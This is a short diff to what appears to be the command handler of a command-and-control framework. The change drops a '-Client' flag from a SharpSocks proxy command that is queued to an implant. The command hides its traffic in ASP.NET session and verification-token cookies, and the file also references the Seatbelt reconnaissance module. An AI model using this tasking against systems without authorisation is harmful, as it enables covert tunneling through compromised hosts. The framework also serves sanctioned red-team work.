@@ -117,9 +117,9 @@ def handle_sharp_command(command, user, randomuri, startup):
       if ri.lower() == "n":
         print("")        
       if ri == "":
-        new_task("run-exe SharpSocksImplantTestApp.Program SharpSocks -Client -s %s -c %s -k %s -url1 %s -url2 %s -b 2000 --session-cookie ASP.NET_SessionId --payload-cookie __RequestVerificationToken" % (sharpurl,channel,sharpkey,sharpurls[0].replace("\"",""),sharpurls[1].replace("\"","")), user, randomuri)
+        new_task("run-exe SharpSocksImplantTestApp.Program SharpSocks -s %s -c %s -k %s -url1 %s -url2 %s -b 2000 --session-cookie ASP.NET_SessionId --payload-cookie __RequestVerificationToken" % (sharpurl,channel,sharpkey,sharpurls[0].replace("\"",""),sharpurls[1].replace("\"","")), user, randomuri)
       if ri.lower() == "y":
-        new_task("run-exe SharpSocksImplantTestApp.Program SharpSocks -Client -s %s -c %s -k %s -url1 %s -url2 %s -b 2000 --session-cookie ASP.NET_SessionId --payload-cookie __RequestVerificationToken" % (sharpurl,channel,sharpkey,sharpurls[0].replace("\"",""),sharpurls[1].replace("\"","")), user, randomuri)
+        new_task("run-exe SharpSocksImplantTestApp.Program SharpSocks -s %s -c %s -k %s -url1 %s -url2 %s -b 2000 --session-cookie ASP.NET_SessionId --payload-cookie __RequestVerificationToken" % (sharpurl,channel,sharpkey,sharpurls[0].replace("\"",""),sharpurls[1].replace("\"","")), user, randomuri)
     
     elif "seatbelt " in command.lower():
         check_module_loaded("Seatbelt.exe", randomuri, user)
